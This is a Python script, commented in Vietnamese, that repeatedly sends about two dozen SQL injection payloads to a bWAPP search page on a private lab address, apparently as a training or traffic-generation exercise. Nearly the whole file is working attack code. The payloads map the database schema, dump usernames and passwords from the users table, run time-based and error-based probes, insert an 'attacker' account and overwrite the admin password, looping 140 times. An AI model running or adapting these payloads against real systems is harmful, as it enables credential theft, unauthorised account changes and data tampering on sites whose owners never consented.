# chu y thay doi ip va PHPSESSID
import requests
import time

# URL của trang mà bạn muốn tấn công SQL injection
url = "http://192.168.10.10/sqli_1.php"

# Danh sách các payload SQL injection
payloads = [
    "lam' UNION SELECT null, null, null, null, null, null, null-- -",
    "lam' UNION SELECT 1,2,3,4,5,6,7-- -",
    "lam' UNION SELECT 1, user(), database(), version(), 5, 6, 7-- -",
    "lam' UNION SELECT 1, table_name, null, null, null, null, null FROM information_schema.tables-- -",
    "lam' UNION SELECT 1, column_name, null, null, null, null, null FROM information_schema.columns WHERE table_name='users'-- -",
    "lam' UNION SELECT 1, login, password, null, null, null, null FROM users-- -",
    "lam' OR 1=1-- -",
    "lam' OR 1=1#",
    "lam' AND 1=2 UNION SELECT 1, user(), database(), version(), null, null, null-- -",
    "lam' AND 1=2 UNION SELECT 1, CONCAT_WS(':', user(), database()), null, null, null, null, null-- -",
    "lam' AND updatexml(1, concat(0x3a, (SELECT @@version)), 1)-- -",
    "lam' AND IF(1=1, SLEEP(5), 0)-- -",
    "lam' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)-- -",
    "lam'; INSERT INTO users (username, password) VALUES ('attacker', 'password');-- -",
    "lam'; SELECT * FROM users;-- -",
    "lam'; UPDATE users SET password = 'newpass' WHERE login = 'admin';-- -",
    "lam' ORDER BY 1-- -",
    "lam' ORDER BY 2-- -",
    "lam' GROUP BY login-- -",
    "lam' UNION SELECT 1,2,3,4,5,6,7 ORDER BY 1-- -",
    "iron' union select 1,2,3,4,5,6,7– –",
    "' order by 6 -- -",
    "' and 1=0 union all select 1,table_schema,table_name,4,5,6,7 from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' -- -",
    "' and 1=0 union all select 1,table_name, column_name,4,5,6,7 from information_schema.columns where table_schema != 'mysql' and table_schema != 'information_schema' and table_schema='bWAPP' and table_name='users' -- -",
    "' and 1=0 union all select 1,login,password,secret,email,admin,7 from users-- -",
    "a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--"
]

# Headers nếu cần thiết (ví dụ Cookie để đăng nhập vào bWAPP)
headers = {
    'Cookie': 'security_level=0; PHPSESSID=hsgaj3d1fdmnp9mhgq0h7410e7'  # Thay PHPSESSID bằng giá trị thực tế
    # mỗi lần đăng nhập vào bWAPP là nó lại thay đổi PHPSESSID nên mỗi lần đăng nhập thì phải sửa lại
    # security_level=0 : tấn công mức low
}

# Tổng số lần lặp lại mỗi payload, mỗi payload là 7 yêu cầu
iterations = 140

# Tự động gửi từng payload lặp lại
for i in range(iterations):
    for payload in payloads:
        # Tạo tham số truy vấn cho SQL injection, với title là payload và action là search
        params = {'title': payload, 'action': 'search'}
        
        # Gửi yêu cầu GET với tham số và headers
        response = requests.get(url, params=params, headers=headers)
        
        # Kiểm tra và hiển thị kết quả trả về
        if response.status_code == 200:
            print(f"Request {i + 1} Thành công")
        else:
            print(f"Request {i + 1} Thất bại")

        # Tạm dừng giữa các yêu cầu để tránh làm quá tải hệ thống
        time.sleep(0.1)  # Tạm dừng 1 giây giữa các yêu cầu (có thể điều chỉnh)
